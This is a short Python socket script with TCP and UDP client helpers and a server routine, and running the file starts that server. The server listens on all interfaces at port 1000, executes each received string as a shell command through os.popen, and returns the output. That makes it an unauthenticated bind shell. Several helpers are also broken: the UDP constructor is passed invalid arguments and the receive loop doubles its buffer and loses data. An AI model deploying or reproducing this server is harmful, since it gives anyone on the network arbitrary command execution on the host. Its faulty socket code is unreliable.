#!python
import os
import socket
import sys


def tcpSocket(ip, port, massage):
    socker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return socketClient(ip, port, massage, socker)

def udpsocket(ip, port, massage):
    socker = socket.socket(socket.AddressFamily, socket.socketpair)
    return socketClient(ip, port, massage, socker)

def udpClientSocket(ip, port, massage):
    '''
    udp客户端链接
    :param ip:
    :param port:
    :param massage:
    :return:
    '''
    udp_socke = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    local_addr = ('', 7788)  # ip地址和端口号，ip一般不用写，表示本机的任何一个ip
    udp_socke.bind(local_addr)
    udp_socke.sendto(massage, (ip, int(port)))
    recv_data = udp_socke.recvfrom(1024)
    print(recv_data[0])
    print(recv_data[1])
    udp_socke.close()


def socketClient(ip, port, massage, socketer):

    socketer.connect((ip, int(port)))
    socketer.send(massage)
    while True:
        buff = socketer.recv(56656)
        if not buff:
            socketer.close()
            break
        buff += buff

    print(buff)
    return buff



def serverSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 1000))
    sock.listen(5)
    while True:
        try:
            conn, addr = sock.accept()
            ret = conn.recv(2048)
            result = os.popen(ret).read()
            conn.send(result)
        except KeyboardInterrupt:
            sys.exit(0)

    sock.close()

if __name__ == '__main__':
    # tcpSocket('127.0.0.1', 8080, 'nihao'.encode('utf-8'))
    serverSocket()
